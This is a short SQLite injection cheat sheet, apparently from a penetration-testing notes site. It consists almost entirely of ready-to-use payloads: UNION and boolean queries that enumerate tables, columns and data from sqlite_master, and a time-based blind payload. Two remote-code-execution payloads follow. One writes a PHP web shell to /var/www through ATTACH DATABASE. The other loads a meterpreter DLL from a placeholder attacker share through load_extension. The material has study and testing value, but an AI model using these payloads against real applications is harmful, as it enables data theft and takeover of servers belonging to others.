# SQLite Injection

## UNION and BOOLEAN (Methodology)

```sql
# Tables:
SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' # Integer/String based - Extract table name
SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 2 offset 1 # Use limit X+1 offset X, to extract all tables.
# Columns:
SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name' # Integer/String based - Extract column name
SELECT replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'')),"TEXT",''),"INTEGER",''),"AUTOINCREMENT",''),"PRIMARY KEY",''),"UNIQUE",''),"NUMERIC",''),"REAL",''),"BLOB",''),"NOT NULL",''),",",'~~') FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='table_name' # For a clean output

# Boolean - Count number of tables:
and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) < number_of_table
# Boolean - Enumerating table name:
and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0)=table_name_length_number
# Boolean - Extract info:
' union select <COLUMN NAME>,2,3,4 FROM <TABLE NAME> limit 1 offset <0,1,2,...>-- -
' union select <COLUMN NAME>,2,3,4 FROM <TABLE NAME> limit <0,1,2,...>,1-- -
' UNION SELECT group_concat(<COLUMN NAME> || "," || <COLUMN NAME> || "," || <COLUMN NAME> || ":") from <table name>
' union select group_concat(<COLUMN NAME>, '~~'),2,3,4 FROM <TABLE NAME>-- - # Extract all the data from the column.
and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) > hex('some_char')
```

## Others

#### TIME Based

```sql
AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
```

#### Remote Command Execution using SQLite command - Attach Database

```sql
ATTACH DATABASE '/var/www/lol.php' AS lol;CREATE TABLE lol.pwn (dataz text);INSERT INTO lol.pwn (dataz) VALUES ('<?system($_GET['cmd']); ?>');--
```

#### Remote Command Execution using SQLite command - Load\_extension

```sql
UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
```

{% hint style="info" %}
Note: By default this component is disabled.
{% endhint %}

## References

* [https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf](https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf)
